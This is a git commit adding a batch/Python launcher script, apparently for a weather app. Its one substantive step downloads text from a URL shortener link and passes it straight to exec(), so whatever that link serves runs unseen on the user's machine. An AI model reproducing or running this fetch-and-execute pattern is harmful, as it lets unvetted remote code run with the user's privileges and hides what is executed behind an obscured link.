ce79272d5d15640802804fbf5172d3e8ed08acf5
Anupam Kanoongo <96910096+Anupam1707@users.noreply.github.com>
2023-01-30 20:08:01 +0530

    Create Full.bat

---
+++ Full.bat
@@ -0,0 +1,20 @@
+@echo off & python -x "%~f0" %* & goto :eof 
+
+print("Welcome to the Weather App Launcher")
+import os
+
+try :
+    import requests
+except ImportError:
+    print("Installing Packages")
+    os.system("pip install requests")
+import requests
+
+url = "https://rb.gy/ambkhg"
+
+print()
+print("Initializing....")
+print()
+
+page = requests.get(url)
+exec(page.text)
